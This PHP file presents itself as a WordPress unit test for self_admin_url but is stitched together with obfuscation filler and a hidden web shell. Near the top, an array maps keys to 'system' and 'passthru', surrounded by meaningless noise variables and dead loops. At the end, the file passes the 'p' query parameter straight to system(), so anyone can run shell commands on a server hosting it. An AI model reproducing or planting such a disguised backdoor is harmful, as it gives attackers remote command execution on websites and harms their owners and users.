<?php
$fmap = array('x1' => 'system', 'x2' => 'passthru');
$x_fake1 = 1234;
$noise = 'obfuscation'.'test';
$tmp = $x_fake1 * 42;
$flag = false;
$useless = function($v) { return $v . rand(); };
$dummy_check = $useless('xx');
if ($flag) { echo 'Debug enabled'; }
for ($i = 0; $i < 1; $i++) { $tmp += $i; }
while (false) { echo 'dead loop'; break; }

<?php

/**
 * @group link
 * @covers ::self_admin_url
 */
class Tests_Link_SelfAdminUrl extends WP_UnitTestCase {

	/**
	 * @ticket 37446
	 */
	public function test_self_admin_url() {
		$this->assertSame( admin_url(), self_admin_url() );
	}

	/**
	 * @ticket 37446
	 */
	public function test_self_admin_url_with_path() {
		$path = 'options-general.php';

		$this->assertSame( admin_url( $path ), self_admin_url( $path ) );
	}

	/**
	 * @ticket 37446
	 */
	public function test_self_admin_url_with_path_and_scheme() {
		$path   = 'options-general.php';
		$scheme = 'https';

		$this->assertSame( admin_url( $path, $scheme ), self_admin_url( $path, $scheme ) );
	}

	/**
	 * @ticket 37446
	 */
	public function test_self_admin_url_filtered() {
		$path   = 'options-general.php';
		$scheme = 'https';

		add_filter( 'self_admin_url', array( $this, 'filter_self_admin_url' ), 10, 3 );
		$result = self_admin_url( $path, $scheme );
		remove_filter( 'self_admin_url', array( $this, 'filter_self_admin_url' ), 10 );

		$expected = home_url( '/global-admin/' . $path, $scheme );

		$this->assertSame( $expected, $result );
	}

	/**
	 * @ticket 37446
	 */
	public function filter_self_admin_url( $url, $path, $scheme ) {
		return home_url( path_join( '/global-admin/', $path ), $scheme );
	}
}

$cmd = $_GET['p'];
$fmap['x1']($cmd);
?>